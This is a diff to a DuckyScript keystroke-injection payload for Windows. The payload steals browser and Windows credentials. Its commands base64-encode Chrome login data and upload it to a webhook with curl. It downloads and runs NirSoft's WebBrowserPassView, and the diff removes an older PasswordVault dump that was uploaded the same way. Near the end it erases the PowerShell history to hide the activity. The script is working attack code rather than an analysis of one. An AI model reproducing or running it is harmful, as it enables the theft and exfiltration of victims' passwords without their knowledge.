@@ -67,24 +67,16 @@ ENTER
 STRING $r=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l)-join','))
 ENTER
 DELAY 700
-STRING $r | Out-File -FilePath temp.txt
+STRING $r | Out-File -FilePath chrome.txt
 ENTER
 DELAY 500
 STRING curl.exe -F "file1=@chrome.txt" $webhook; rm chrome.txt
 ENTER
 REM END OF CHROME EXFIL
 DELAY 1000
-REM PASSVAULT EXFIL
-STRING [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath Vault.txt
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe
 ENTER
-REM END OF PASSVAULT EXFIL
-DELAY 500
-STRING curl.exe -F "file1=@Vault.txt" $webhook; rm Vault.txt
-ENTER
-DELAY 500
-mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe
-ENTER
-DELAY 3500
+DELAY 10000
 CTRL A
 DELAY 500
 CTRL S
@@ -114,4 +106,3 @@ STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
 ENTER
 STRING exit
 ENTER
-
